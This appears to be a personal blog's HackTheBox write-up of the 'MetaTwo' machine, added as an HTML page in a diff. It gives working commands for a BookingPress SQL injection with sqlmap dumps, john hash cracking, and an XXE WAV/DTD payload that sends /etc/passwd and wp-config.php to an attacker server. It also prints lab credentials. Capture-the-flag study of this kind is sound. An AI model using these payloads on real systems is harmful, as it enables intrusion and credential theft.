@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<style>
+    body {
+        background-color: #363636;
+        /* background-color:bisque; */
+        color: whitesmoke;
+        font-family:Arial, Helvetica, sans-serif
+    }
+
+    a {
+        text-decoration: none; 
+        color: inherit;
+    }
+
+    .topnav {
+        background-color: #242424;
+        overflow: hidden;
+        position: fixed;
+        width: 100%;
+        top: 0;
+        right: 0;
+    }
+
+    .topnav .name {
+        float: left;
+        color: #f2f2f2;
+        text-align: center;
+        padding: 14px 16px;
+        text-decoration: none;
+        font-size: 17px;
+    }
+
+    .topnav a {
+        float: right;
+        color: #f2f2f2;
+        text-align: center;
+        padding: 14px 16px;
+        font-size: 17px;
+    }
+
+
+    .topnav a:hover {
+        background-color: #ddd;
+        text-decoration-line: underline;
+        color: black;
+    }
+
+    .topnav a.active {
+        background-color:#0077ff;
+        color:white;
+    }
+
+    .topnav .center-topnav {
+        margin: auto;
+        width: 80%;
+        max-width: 930px
+    }
+
+    .content {
+        margin: auto;
+        width: 80%;
+        max-width: 900px;
+        padding-top: 50px;
+        display: grid;
+        line-height: 1.5em;
+        /* border-color: #0077ff; border-width: 2px; border-style: solid; */
+    }
+
+
+
+    .content p {
+        margin-bottom:0px;
+    }
+
+    /* .content .cell {
+        border-color: green;
+        border-width: 2px;im al
+        border-style: solid;
+    } */
+
+    .content .cell .text {
+        margin:auto;
+        text-align: center;
+    }
+
+    .content h2 {
+        margin-top:40px;
+        margin-bottom:0px;
+    }
+
+    .content h3 {
+        margin-bottom:0px;
+    }
+
+    .content .box-icon {
+        display: block;
+        width: 20%;
+    }
+
+    pre {
+        overflow: auto;
+    }
+
+    pre code {
+        background-color: #000;
+        border: 1px solid #999;
+        display: block;
+        padding: 15px;
+        overflow: auto;
+    }
+
+    img {
+        margin-top: 10px;
+        width: 80%
+    }
+
+    h1, h2 {
+        color:#0077ff
+    }
+
+    h3 {
+        color:#99c9ff
+    }
+
+</style>
+
+<head>
+    <div class="topnav">
+        <div class="center-topnav">
+            <a href=/index.html class="name">Jaguar Perlas</a>
+            <a class="active" href="/hack/hacks/index.html">Hacks</a>
+            <a href="/hack/about.html">About me</a>
+            <a href="/hack/index.html">Home</a>
+        </div>
+    </div>
+</head>
+
+<body>
+    <div class="content">
+
+        <h1>[Easy] MetaTwo</h1>
+        <img class="box-icon" src="/hack/images/metatwo.png"></img>
+        <p><i>Full compromise on April 17, 2023</br>Written on March 21, 2024</i></p>
+        <p>MetaTwo is my ninth machine to compromise on HackTheBox. This machine features an SQL injection vulnerability to get WordPress administrator, an XXE vulnerability to
+            move to a low-privileged user, and a weak passphrase used to encrypt root's password.
+        </p>
+        <h2>Enumeration</h2>
+        <h3>Nmap</h3>
+        <p>Let's start with an Nmap scan.</p>
+        <pre><code>nmap 10.10.11.186 -p- --min-rate=3000</code></pre>
+        <img src="../images/metatwo2.png">
+        <p>Ports 21, 22, and 80 are open. Let's use Nmap again to get more information about them.</p>
+        <pre><code>nmap 10.10.11.186 -p21,22,80 -sC -sV --min-rate=3000</code></pre>
+        <img src="../images/metatwo3.png">
+        <p>From the output, it seems we're dealing with FTP and a web application. The output also shows that Nmap was redirected to http://metapress.htb
+            when accessing http://10.10.11.186. Let's add this to our hosts file anyway so our browser knows the IP address to metapress.htb.</p>
+        <pre><code>echo "10.10.11.186" metapress.htb | sudo tee -a /etc/hosts</br>cat /etc/hosts</code></pre>
+        <img src="../images/metatwo4.png">
+        <h3>Port 21 - FTP</h3>
+        <p>Checking out FTP, it seems like anonymous login isn't allowed. We could try brute-forcing the login but HackTheBox generally doesn't allow problems/machines like that.
+            From the machine submission best practices, it states:</p>
+        <img src="../images/metatwo4a.png">
+        <p>We'll continue on with other ports and come back to FTP if we find potential credentials.</p>
+        <h3>Port 80</h3>
+        <p>Navigating to http://metapress.htb, we are presented with this page:</p>
+        <img src="../images/metatwo5.png">
+        <p>Judging from this page, this looks like a Wordpress website. This template is too familiar with me. We can use a tool called wpscan to scan the website
+            for interesting files, themes, and plugins. I use the option "-e vp" to enumerate vulnerable plugins, and "--plugins-detection aggressive" to cover more plugins. </p>
+        <pre><code>wpscan --url http://metapress.htb -e vp --plugins-detection aggressive </code></pre>
+        <img src="../images/metatwo6.png">
+        <p>Unfortunately the scanner did not find any vulnerable plugins.</p>
+        <img src="../images/metatwo7.png">
+        <p>The scanner did find a robots.txt file:</p>
+        <img src="../images/metatwo8.png">
+        <p>Investigating the file, it contained a URL to a sitemap file. The sitemap file is essentially a list of pages that is used to make content more visible to search engines.
+            The pages seemed normal and nothing stood out of the ordinary.</p>
+        <img src="../images/metatwo9.png">
+        <img src="../images/metatwo10.png">
+        <p>The scanner also picked up a readme.html file, but it's just a regular ordinary README file that's included in every install for other software.</p>
+        <p>At this point, it's time to do manual enumeration. Scanners like wpscan could miss some things that manual enumeration would pick up easily.</p>
+        <p>In the events page, this website includes a booking feature where users can select a service and make appointments.</p>
+        <img src="../images/metatwo11.png">
+        <p>This is clearly a plugin, judging how it's made versus the rest of the website. It stands out. To verify, the page source confirms that this is a plugin called
+            "bookingpress-appointment-booking".</p>
+        <img src="../images/metatwo12.png">
+        <p>Being familiar of how Wordpress structures their directories, we can find the version of the plugin at http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/readme.txt.</p>
+        <img src="../images/metatwo13.png">
+        <p>Searching for any vulnerabilities on the plugin, we find an article by wpscan.com indicating a SQL injection vulnerability.
+        </br><i>(Our scans earlier did not detect this. This would be detected if we were to tell wpscan to scan ALL plugins, which would take a long time.)</i></p>
+        <img src="../images/metatwo14.png">
+
+        <h2>Exploit - SQL Injection</h2>
+        <p>The article also includes steps on how to exploit this. How nice of them :).</p>
+        <img src="../images/metatwo15.png">
+        <p>The first two points can be skipped since they're meant for someone trying to replicate the environment. For the 3rd point, we can find the nonce here:</p>
+        <img src="../images/metatwo16.png">
+        <p>Now we'll build our curl command. This curl command will send an SQL injection attack using the UNION SELECT technique. We should see the database version, OS version, and numbers 1-6 in the output.</p>
+        <pre><code>curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=f236e9d61a&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'</code></pre>
+        <img src="../images/metatwo17.png">
+        <p>From our above output, we can see that the database executed our SQL query and gave us what we asked for. Now let's query the database for more information. To do this, we'll use sqlmap to automate things.
+            We'll remove our current SQL injection query from the total_service parameter and mark the it with a "*" so that sqlmap will target that parameter only. We know the database is MySQL, so we'll specify sqlmap
+            to use MySQL injections. We'll also increase the risk and level to 3 to find other potential ways to inject.</p>
+        <p>Sqlmap found our UNION query injection from before, and also found a new boolean-based injection.</p>
+        <pre><code>sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" --data 'action=bookingpress_front_get_category_services&_wpnonce=d0466b60ee&category_id=33&total_service=1234t*' --dbms mysql --risk 3 --level 3</code></pre>
+        <img src="../images/metatwo18.png">
+        <p>Using sqlmap, we'll list all databases with the "--dbs" option.</p>
+        <pre><code>sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" --data 'action=bookingpress_front_get_category_services&_wpnonce=d0466b60ee&category_id=33&total_service=1234t*' --dbms mysql --dbs </code></pre>
+        <img src="../images/metatwo19.png">
+        <p>There are two databases, blog and information_schema. Let's look at what tables are in blog by adding the option "-D blog" to select the blog database and "--tables" to grab all tables.</p>
+        <pre><code>sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" --data 'action=bookingpress_front_get_category_services&_wpnonce=d0466b60ee&category_id=33&total_service=1234t*' --dbms mysql --dbs -D blog --tables</code></pre>
+        <img src="../images/metatwo20.png">
+        <p>Sqlmap identified 27 tables in the blog database. We'll look into the table "wp_users" to see if we can extract user credentials. We'll add the option "-T wp_users" to select the wp_users table and "--dump" to 
+            show everything.</p>
+        <pre><code>sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" --data 'action=bookingpress_front_get_category_services&_wpnonce=d0466b60ee&category_id=33&total_service=1234t*' --dbms mysql --dbs -D blog -T wp_users --dump</code></pre>
+        <img src="../images/metatwo21.png">
+        <p>We now have hashes for users admin and manager. I've saved them to a file named hash and passed it to a tool called john to crack them using the rockyou.txt wordlist.</p>
+        <pre><code>john hash --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>
+        <img src="../images/metatwo22.png">
+        <p>John was able to crack the manager password, but not the admin password. We can test the manager password by using it in the WordPress admin login page at http://metapress.htb/wp-admin.
+            Spoiler alert: it does work and we've successfully logged in.</p>
+        <img src="../images/metatwo23.png">
+        <p>Looking around, it seems we can't do very much with the manager user. We can only upload new media.</p>
+        <img src="../images/metatwo24.png">
+        <p>We can find the WordPress version at http://metapress.htb/wp-admin/about.html, which is 5.6.2.</p>
+        <img src="../images/metatwo25.png">
+        <p>Combining the version and searching for a WordPress media upload exploit, we find a public article about an XML external entities (XXE) vulnerability.</p>
+        <img src="../images/metatwo26.png">
+
+        <h2>Exploit 2 - XXE</h2>
+        <p>The article explains the details about the vulnerability and even shows how we can reproduce it.</p>
+        <img src="../images/metatwo27.png">
+        <p>We'll create the payload.wav file and change the IP address to our attack machine as so:</p>
+        <pre><code>echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00&lt;xml version="1.0"?>&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM '"'"'http://10.10.14.4:8000/evil.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav</code></pre>
+        <p>And we'll create the evil.dtd file, changing the IP address to our attack machine:</p>
+        <pre><code>&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"></br>&lt;!ENTITY % init "&lt;!ENTITY &#x25; trick SYSTEM 'http://10.10.14.4:8000/?p=%file;'>" ></code></pre>
+        <img src="../images/metatwo28.png">
+        <p>Next we'll start a web server on port 8000 and upload our malicious .wav file. After uploading, the target machine will make a request to our web server to get the evil.dtd file. The target machine will then
+            read the evil.dtd and encode the /etc/passwd file in base64. The result is stored in a variable called file. Then the target machine will make a request to our web server to get a file named exactly what the file variable holds.
+            This essentially exfiltrates data to our machine as we get the base64-encoded data.</p>
+        <img src="../images/metatwo29.png">
+        <p>We'll throw the result into Cyberchef to decode the contents of the /etc/passwd file from Base64.</p>
+        <img src="../images/metatwo30.png">
+        <p>This confirms that we are able to read files within the target machine by using this exploit.</p>
+        <p>The next file we want to read is wp-config.php. This file contains configurations which may include credentials. Usually, MySQL credentials are contained in this file and is located in the root WordPress directory.</p>
+        <p>We can safely assume that the target machine is reading uploaded files from a path that's already in the WordPress directory, such as /wordpress/uploads. We can modify our evil.dtd file to go up one directory and grab wp-config.php (../wp-config.php),
+            assuming it's there. If it's not there, we can try to go up one more time. If we feel like we've went up too many times, then the wp-config.php is in another directory.</p>
+        <pre><code>&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=../wp-config.php"></br>&lt;!ENTITY % init "&lt;!ENTITY &#x25; trick SYSTEM 'http://10.10.14.4:8000/?p=%file;'>" ></code></pre>
+        <img src="../images/metatwo31.png">
+        <p>Luckily, after uploading payload.wav again, we get a hit. The file wp-config.php was only one directory above.</p>
+        <img src="../images/metatwo32.png">
+        <p>Throwing this into Cyberchef to decode it from base64, we get new credentials to access the database (we've already accessed this) and FTP.</p>
+        <img src="../images/metatwo33.png">
+        <p>Let's try the FTP credentials on FTP.</p>
+        <pre><code>ftp metapress.htb@10.10.11.186</br>9NYS_ii@FyL_p5M2NvJ</code></pre>
+        <img src="../images/metatwo34.png">
+        <p>It works. We can see two directories named blog and mailer. Blog contains the source files for WordPress. On the other hand, mailer has files we've never encountered before.</p>
+        <img src="../images/metatwo35.png">
+        <p>Looking into the send_email.php script, we can find credentials for a user named jnelson.</p>
+        <img src="../images/metatwo36.png">
+        <p>These credentials work for SSH. We're in the target machine as jnelson.</p>
+        <pre><code>ssh jnelson@10.10.11.186</br>Cb4_JmWM8zUZWMu@Ys</code></pre>
+        <img src="../images/metatwo37.png">
+        <p>We got user.txt flag.</p>
+        <img src="../images/metatwo38.png">
+
+        <h2>Privilege Escalation</h2>
+        <p>Off the bat, we see an unusual hidden directory in jnelson's home directory named .passpie</p>
+        <img src="../images/metatwo39.png">
+        <p>The .passpie directory contains two files, .config and .keys, and a directory named ssh which contains two files, jnelson.pass and root.pass.</p>
+        <img src="../images/metatwo40.png">
+        <p>Searching up what the heck passpie is, it's basically a password manager for Linux that are encrypted using GnuPG. From official documentation:</p>
+        <img src="../images/metatwo41.png">
+        <p>By simply running the command passpie, we can see there are saved passwords for jnelson and root. If we try to export the password database, we are prompted for a passphrase.</p>
+        <pre><code>passpie</br>passpie export pass.txt</code></pre>
+        <img src="../images/metatwo42.png">
+        <p>If we look into the .keys file, we can see that we have a public and private key. We can try to decrypt the private key by turning it into a hash and cracking it using john to reveal the passphrase and copy root's password.</p>
+        <p>First, I selected the private key, copy, and pasted it into a file on my attack machine. Then used gpg2john to turn it into a hash.</p>
+        <pre><code>nano key</br>cat key</br>gpg2john key > hash</br>cat hash</code></pre>
+        <img src="../images/metatwo43.png">
+        <p>Now that we have the hash, let's use john to crack it with the rockyou.txt wordlist.</p>
+        <pre><code>john hash --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>
+        <img src="../images/metatwo44.png">
+        <p>We cracked the hash. The passphrase to access the password database is blink182. Let's try to export it to a text file named pass.txt.</p>
+        <pre><code>passpie export pass.txt</br>blink182</br>cat pass</code></pre>
+        <img src="../images/metatwo45.png">
+        <p>Success, we now have root's password. Let's switch to the root user and get root flag.</p>
+        <pre><code>su root</br>p7qfAZt4_A1xo_0x</br>cat /root/root.txt</code></pre>
+        <img src="../images/metatwo46.png">
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+
+
+    </div>
+</bo11dy>
+
+</html>
